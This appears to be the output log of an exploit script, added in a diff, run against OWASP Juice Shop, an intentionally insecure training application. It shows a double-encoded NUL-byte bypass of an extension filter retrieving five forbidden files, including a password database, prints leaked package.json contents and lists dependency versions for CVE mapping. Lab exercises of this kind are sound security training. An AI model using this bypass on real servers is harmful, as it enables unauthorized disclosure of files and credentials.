@@ -1,0 +1,33 @@
+[*] 1. Direct request is blocked by the extension filter
+    GET /ftp/package.json.bak -> HTTP 403 "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error"
+
+[*] 2. Bypass with a double-encoded NUL byte + allowed extension
+    package.json.bak           direct=403  bypass=200    4263B  BYPASSED
+    coupons_2013.md.bak        direct=403  bypass=200     131B  BYPASSED
+    incident-support.kdbx      direct=200  bypass=200    3246B  BYPASSED
+    suspicious_errors.yml      direct=403  bypass=200     723B  BYPASSED
+    encrypt.pyc                direct=403  bypass=200     573B  BYPASSED
+
+[*] 3. Contents of the file the server tried to hide
+    {
+      "name": "juice-shop",
+      "version": "6.2.0-SNAPSHOT",
+      "description": "An intentionally insecure JavaScript Web Application",
+      "homepage": "http://owasp-juice.shop",
+      "author": "Björn Kimminich <bjoern.kimminich@owasp.org> (https://kimminich.de)",
+      "contributors": [
+        "Björn Kimminich",
+        "Jannik Hollenbach",
+        "Aashish683",
+        "greenkeeper[bot]",
+        "MarcRler",
+        "agrawalarpit14",
+        "Scar26",
+
+[*] Extracting dependency versions from the leaked manifest (useful for CVE mapping):
+    express        ~4.16
+    jsonwebtoken   ~8
+    sanitize-html  1.4.2
+    sequelize      ~4
+
+[+] VULNERABLE: 5 forbidden files downloaded; loot saved to /workspace/loot/package.json.bak
